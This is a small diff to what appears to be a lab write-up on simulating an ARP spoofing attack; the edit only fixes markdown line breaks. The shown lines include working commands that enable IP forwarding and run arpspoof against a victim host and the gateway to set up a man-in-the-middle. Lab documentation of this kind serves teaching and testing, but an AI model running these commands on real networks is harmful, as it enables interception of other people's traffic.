@@ -15,7 +15,7 @@ This section documents the steps used to simulate an ARP spoofing attack in the 
 `sudo sysctl -w net.ipv4.ip_forward=1`
 
 ### 2. Launch ARP Spoofing Attack
-// Spoofing Ubuntu that i am the Gateway.
+// Spoofing Ubuntu that i am the Gateway.\
 `sudo arpspoof -i eth0 -t 192.168.56.20 192.168.56.1`\
 // Spoofing Gateway that i am Ubuntu.\
 `sudo arpspoof -i eth0 -t 192.168.56.1 192.168.56.20`
